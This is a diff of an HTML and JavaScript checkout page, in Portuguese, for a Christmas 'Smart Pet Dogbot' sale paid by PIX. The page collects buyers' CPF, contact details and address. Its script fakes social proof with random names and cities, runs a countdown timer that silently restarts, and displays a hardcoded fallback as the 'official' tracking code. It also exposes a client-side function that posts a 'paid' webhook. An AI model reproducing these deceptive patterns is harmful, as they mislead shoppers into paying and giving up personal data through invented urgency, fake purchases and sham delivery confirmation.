+                    <button type="submit" class="btn-buy" id="btnSubmitPayment" style="margin-top:12px;">
+                        ⚡ GERAR PIX DE R$ 99,90 E LIBERAR RASTREIO
+                    </button>
+                </form>
+            </div>
+
+            <!-- ETAPA 2: Carregando -->
+            <div id="loadingStep" style="display:none; padding:40px 10px;">
+                <div style="border:4px solid #e2e8f0; border-top:4px solid var(--accent-blue); border-radius:50%; width:46px; height:46px; animation:spin 0.9s linear infinite; margin:0 auto;"></div>
+                <h3 style="margin-top:16px; color: var(--secondary-color);">Registrando Endereço & Gerando PIX Oficial...</h3>
+                <p style="font-size:0.86rem; color:var(--text-muted); margin-top:4px;">Reservando sua unidade e preparando seu código de rastreio...</p>
+            </div>
+
+            <!-- ETAPA 3: QR Code PIX + Alerta de Rastreio -->
+            <div id="pixDisplayStep" style="display:none;">
+                <span style="background:#dcfce7; color:#15803d; font-size:0.75rem; font-weight:800; padding:4px 10px; border-radius:20px;">✅ ENDEREÇO REGISTRADO • RASTREIO PRONTO PARA LIBERAÇÃO</span>
+                <h2 style="margin-top:10px; color: var(--secondary-color);">Pagamento Exclusivo via PIX</h2>
+                <p style="font-size:0.84rem; color:var(--text-muted);">Escaneie o QR Code no app do seu banco ou copie o código abaixo:</p>
+
+                <div class="tracking-pix-warning">
+                    🚨 <strong>NÃO FECHE ESTA TELA!</strong> Assim que você confirmar o pagamento de <strong>R$ 99,90</strong> no seu banco, esta janela abrirá <strong>AUTOMATICAMENTE</strong> a página com o seu <strong>CÓDIGO DE RASTREIO</strong> para entrega no endereço informado!
+                </div>
+
+                <div class="qr-placeholder">
+                    <img id="pixQrImg" src="" alt="QR Code Pix SyncPay" style="width:100%; height:100%; object-fit:contain;">
+                </div>
+
+                <div class="pix-code-box" id="pixCode"></div>
+
+                <button class="btn-copy" id="btnCopyPix" onclick="copyPix()">📋 COPIAR CÓDIGO PIX (COPIA E COLA)</button>
+
+                <div class="realtime-status-box">
+                    <span class="pulse-dot"></span>
+                    <span>Aguardando pagamento para abrir sua Página de Rastreio...</span>
+                </div>
+            </div>
+
+            <!-- ETAPA 4: Página Oficial com Código de Rastreio -->
+            <div id="successStep" style="display:none; padding:15px 5px; text-align:center;">
+                <div style="font-size:3.2rem;">🎉</div>
+                <span style="background:#dcfce7; color:#15803d; font-weight:800; font-size:0.78rem; padding:4px 12px; border-radius:20px;">PAGAMENTO PIX CONFIRMADO • OBJETO POSTADO</span>
+                <h2 style="color:var(--secondary-color); margin:10px 0 6px;">Aqui Está Seu Código de Rastreio!</h2>
+                <p style="font-size:0.88rem; color:#475569;">
+                    Olá, <strong id="trackingClientName">Cliente</strong>! Seu pagamento de <strong>R$ 99,90</strong> foi confirmado pela SyncPay. Acompanhe a entrega com o código oficial abaixo:
+                </p>
+
+                <div class="tracking-code-box">
+                    <span style="font-size:0.75rem; font-weight:800; color:#059669; display:block;">CÓDIGO DE RASTREIO OFICIAL (CORREIOS / EXPRESSO):</span>
+                    <div id="trackingCodeDisplay" class="tracking-code-number">XP849201745BR</div>
+                    <button type="button" class="btn-copy" id="btnCopyTracking" onclick="copyTrackingCode()" style="background:#0f172a;">
+                        📋 COPIAR CÓDIGO DE RASTREIO
+                    </button>
+                </div>
+
+                <div style="background:#eff6ff; border:1px solid #bfdbfe; color:#1e3a8a; padding:12px; border-radius:10px; font-size:0.84rem; text-align:left; margin-bottom:14px;">
+                    📍 <strong>Endereço de Entrega Confirmado:</strong><br>
+                    <span id="trackingAddressDisplay">Rua das Flores, 123 - Centro</span><br>
+                    <small>Previsão: 7 a 14 dias úteis (Entrega Garantida Antes do Natal!).</small>
+                </div>
+
+                <button class="btn-buy" onclick="closeModal()">CONCLUIR</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Prova Social -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <footer>
+        <p style="font-weight: 700; color: #fff, margin-bottom: 6px;">🎄 SMART PET BRASIL — CAMPANHA OFICIAL DE NATAL</p>
+        <p>&copy; 2026 Todos os direitos reservados. Pagamentos processados com segurança via SyncPay.</p>
+    </footer>
+
+    <script>
+        const API_URL = '/api';
+        let currentIdentifier = null;
+        let pollingInterval = null;
+        let savedTrackingCode = '';
+        let savedClientName = '';
+        let savedAddressFull = '';
+
+        // Galeria
+        function changeImage(thumbElement, imgSrc) {
+            const mainImg = document.getElementById('mainProductImg');
+            mainImg.style.opacity = '0.3';
+            setTimeout(() => {
+                mainImg.src = imgSrc;
+                mainImg.style.opacity = '1';
+            }, 120);
+
+            document.querySelectorAll('.thumb-item').forEach(el => el.classList.remove('active'));
+            thumbElement.classList.add('active');
+        }
+
+        // Máscaras
+        function maskCpf(input) {
+            let v = input.value.replace(/\D/g, '');
+            if (v.length > 11) v = v.slice(0, 11);
+            v = v.replace(/(\d{3})(\d)/, '$1.$2');
+            v = v.replace(/(\d{3})(\d)/, '$1.$2');
+            v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            input.value = v;
+        }
+
+        function maskPhone(input) {
+            let v = input.value.replace(/\D/g, '');
+            if (v.length > 11) v = v.slice(0, 11);
+            v = v.replace(/^(\d{2})(\d)/g, '($1) $2');
+            v = v.replace(/(\d)(\d{4})$/, '$1-$2');
+            input.value = v;
+        }
+
+        async function maskCep(input) {
+            let v = input.value.replace(/\D/g, '').slice(0, 8);
+            if (v.length > 5) v = `${v.slice(0, 5)}-${v.slice(5)}`;
+            input.value = v;
+
+            const clean = v.replace(/\D/g, '');
+            if (clean.length === 8) {
+                const statusEl = document.getElementById('cepStatus');
+                statusEl.style.display = 'inline';
+                try {
+                    const res = await fetch(`https://viacep.com.br/ws/${clean}/json/`);
+                    const data = await res.json();
+                    if (!data.erro) {
+                        document.getElementById('addressStreet').value = data.logradouro || '';
+                        document.getElementById('addressNeighborhood').value = data.bairro || '';
+                        document.getElementById('addressCity').value = data.localidade || '';
+                        document.getElementById('addressState').value = data.uf || '';
+                    }
+                } catch (e) {
+                    console.warn(e);
+                } finally {
+                    statusEl.style.display = 'none';
+                }
+            }
+        }
+
+        // Timer
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) timer = duration;
+            }, 1000);
+        }
+
+        window.onload = function () {
+            startTimer(14 * 60 + 59, document.querySelector('#countdown'));
+        };
+
+        // Modal Logic
+        function openModal() {
+            document.getElementById('pixModal').style.display = 'flex';
+            showStep('checkoutFormStep', 'stepTab1');
+        }
+
+        function closeModal() {
+            document.getElementById('pixModal').style.display = 'none';
+            if (pollingInterval) clearInterval(pollingInterval);
+        }
+
+        window.onclick = function(event) {
+            if (event.target == document.getElementById('pixModal')) {
+                closeModal();
+            }
+        }
+
+        function showStep(stepId, activeTabId) {
+            const steps = ['checkoutFormStep', 'loadingStep', 'pixDisplayStep', 'successStep'];
+            steps.forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.style.display = (id === stepId) ? 'block' : 'none';
+            });
+
+            ['stepTab1', 'stepTab2', 'stepTab3'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) {
+                    el.classList.remove('active', 'done');
+                    if (id === activeTabId) el.classList.add('active');
+                }
+            });
+        }
+
+        // Geração do PIX via Node.js / SyncPay
+        async function handleGeneratePix(e) {
+            e.preventDefault();
+            showStep('loadingStep', 'stepTab2');
+
+            savedClientName = document.getElementById('clientName').value;
+            const street = document.getElementById('addressStreet').value;
+            const number = document.getElementById('addressNumber').value;
+            const city = document.getElementById('addressCity').value;
+            const state = document.getElementById('addressState').value;
+            savedAddressFull = `${street}, Nº ${number} - ${city}/${state}`;
+
+            const payload = {
+                amount: 99.90,
+                description: 'Presente de Natal - Cachorro Robô Inteligente Smart Pet Dogbot',
+                client: {
+                    name: savedClientName,
+                    cpf: document.getElementById('clientCpf').value,
+                    email: document.getElementById('clientEmail').value,
+                    phone: document.getElementById('clientPhone').value
+                },
+                address: {
+                    cep: document.getElementById('addressCep').value,
+                    street: street,
+                    number: number,
+                    complement: document.getElementById('addressComplement').value,
+                    neighborhood: document.getElementById('addressNeighborhood').value,
+                    city: city,
+                    state: state
+                }
+            };
+
+            try {
+                const res = await fetch(`${API_URL}/payment/pix`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await res.json();
+                if (!res.ok) throw new Error(data.error || 'Erro ao gerar Pix');
+
+                currentIdentifier = data.identifier;
+                savedTrackingCode = data.trackingCode || 'XP849201745BR';
+                document.getElementById('trackingCodeDisplay').innerText = savedTrackingCode;
+                document.getElementById('pixCode').innerText = data.pixCode;
+                document.getElementById('pixQrImg').src = data.qrCodeImage || `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.pixCode)}`;
+
+                showStep('pixDisplayStep', 'stepTab2');
+                startPaymentPolling(currentIdentifier);
+            } catch (err) {
+                alert('Erro ao conectar ao servidor: ' + err.message);
+                showStep('checkoutFormStep', 'stepTab1');
+            }
+        }
+
+        // Polling do Status do Pagamento
+        function startPaymentPolling(identifier) {
+            if (pollingInterval) clearInterval(pollingInterval);
+
+            pollingInterval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${API_URL}/payment/status/${identifier}`);
+                    if (!res.ok) return;
+                    const data = await res.json();
+
+                    if (data.status === 'paid') {
+                        clearInterval(pollingInterval);
+                        document.getElementById('trackingClientName').innerText = savedClientName;
+                        document.getElementById('trackingAddressDisplay').innerText = savedAddressFull;
+                        showStep('successStep', 'stepTab3');
+                    }
+                } catch (e) {
+                    console.log('Verificando status...', e.message);
+                }
+            }, 3000);
+        }
+
+        // Simulação do Webhook com 1 Clique
+        async function simulateWebhook() {
+            if (!currentIdentifier) return;
+            await fetch(`${API_URL}/webhook/syncpay`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    event: 'cashin.updated',
+                    identifier: currentIdentifier,
+                    status: 'paid',
+                    amount: 99.90
+                })
+            });
+        }
+
+        function copyPix() {
+            const pixCode = document.getElementById("pixCode").innerText;
+            navigator.clipboard.writeText(pixCode).then(() => {
+                const btn = document.getElementById('btnCopyPix');
+                btn.innerText = "CÓDIGO PIX COPIADO! ✅";
+                btn.style.background = "#059669";
+                setTimeout(() => {
+                    btn.innerText = "📋 COPIAR CÓDIGO PIX (COPIA E COLA)";
+                    btn.style.background = "#0f172a";
+                }, 2500);
+            });
+        }
+
+        function copyTrackingCode() {
+            navigator.clipboard.writeText(savedTrackingCode).then(() => {
+                const btn = document.getElementById('btnCopyTracking');
+                btn.innerText = "CÓDIGO DE RASTREIO COPIADO! ✅";
+                btn.style.background = "#059669";
+                setTimeout(() => {
+                    btn.innerText = "📋 COPIAR CÓDIGO DE RASTREIO";
+                    btn.style.background = "#0f172a";
+                }, 2500);
+            });
+        }
+
+        // Toasts
+        const cities = ['São Paulo, SP', 'Rio de Janeiro, RJ', 'Belo Horizonte, MG', 'Curitiba, PR', 'Campinas, SP', 'Brasília, DF'];
+        const names = ['Rodrigo M.', 'Mariana S.', 'Pedro H.', 'Ana Paula', 'Lucas G.', 'Juliana R.', 'Carlos E.'];
+
+        function showToast() {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            const randomCity = cities[Math.floor(Math.random() * cities.length)];
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            toast.innerHTML = `
+                <img src="img/foto-real-cliente-dogbot.jpg" alt="Dogbot" style="width:38px; height:38px; border-radius:8px; object-fit:cover;">
+                <div>
+                    <div style="font-weight:700; color:#0f172a;">${randomName} (${randomCity})</div>
+                    <div style="color:#059669; font-weight:600; font-size:0.75rem;">Garantiu o Dogbot de Natal no PIX!</div>
+                </div>
+            `;
+            container.appendChild(toast);
+            setTimeout(() => toast.remove(), 4800);
+        }
+
+        setTimeout(showToast, 3500);
+        setInterval(showToast, 14000);
+    </script>
+</body>
+</html>
